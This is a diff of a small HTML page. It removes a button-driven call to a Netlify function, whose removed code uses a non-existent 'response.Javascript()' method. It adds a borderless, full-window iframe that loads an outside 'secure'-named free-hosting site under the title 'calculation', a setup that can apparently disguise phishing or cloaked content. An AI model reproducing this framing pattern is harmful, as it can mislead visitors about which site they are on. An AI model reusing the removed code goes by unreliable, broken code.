@@ -3,22 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netlify Serverless Function</title>
+    <title>calculation</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
 </head>
 <body>
-    <h1>Call Netlify Function</h1>
-    <button id="callButton">Call Function</button>
-    <p id="result"></p>
-
-    <script>
-        document.getElementById("callButton").addEventListener("click", function() {
-            fetch("https://www334.netlify.app/.netlify/functions/index.js")
-                .then(response => response.Javascript())
-                .then(data => {
-                    document.getElementById("result").textContent = data.message;
-                })
-                .catch(error => console.error("Error:", error));
-        });
-    </script>
+    <iframe src="http://secure00012.liveblog365.com/"></iframe>
 </body>
 </html>
